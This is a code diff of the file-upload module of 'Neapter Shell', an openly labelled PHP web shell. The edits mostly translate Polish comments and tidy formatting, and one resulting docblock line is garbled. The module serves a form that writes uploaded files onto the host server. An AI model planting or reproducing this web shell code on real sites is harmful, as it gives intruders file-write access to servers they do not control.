@@ -3,27 +3,31 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
- * Zmienianie uprawnien dla pliku
+ * Upload file via HTML form
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @package    NeapterShell
- * @subpackage Modules
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 class ModuleUpload extends ModuleAbstract
 {
     /**
-     * Dostepna lista komend
+     * Get list of available commands
      *
-     * @access public
      * @return array
      */
     public static function getCommands()
@@ -32,9 +36,8 @@ class ModuleUpload extends ModuleAbstract
     }
 
     /**
-     * Zwracanie wersji modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getVersion()
@@ -43,15 +46,14 @@ class ModuleUpload extends ModuleAbstract
     }
 
     /**
-     * Zwracanie pomocy modulu
+     * Get details module information
      *
-     * @access public
      * @return string
      */
     public static function getHelp()
     {
         return <<<DATA
-upload - Wrzucanie pliku na serwer. Jeśli nie podano ścieżki to plik zostanie wrzucony do katalogu, w którym się znajdujemy
+upload - Wrzucanie pliku na serwer. Jeśli nie podano ścieżki, to plik zostanie wrzucony do obecnego katalogu
 
     Użycie:
         upload
@@ -60,14 +62,13 @@ DATA;
     }
 
     /**
-     * Wywolanie modulu
+     * Execute module
      *
-     * @access public
-     * @return string
+     * @return stringUpload file via HTML form
      */
     public function get()
     {
-        if (($aFileData = Request::getFiles('file')) !== FALSE) {
+        if (($aFileData = Request::getFiles('file')) !== false) {
             $sUploadLocation = getcwd() . '/';
 
             if ($this->oArgs->getNumberOfParams() === 0) {
@@ -82,7 +83,8 @@ DATA;
             );
         }
 
-        return sprintf('<form action="%s" method="post" enctype="multipart/form-data">' .
+        return sprintf(
+            '<form action="%s" method="post" enctype="multipart/form-data">' .
             '<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
             '<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
             '<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
@@ -90,5 +92,4 @@ DATA;
             htmlspecialchars(Request::getPost('cmd'))
         );
     }
-
 }
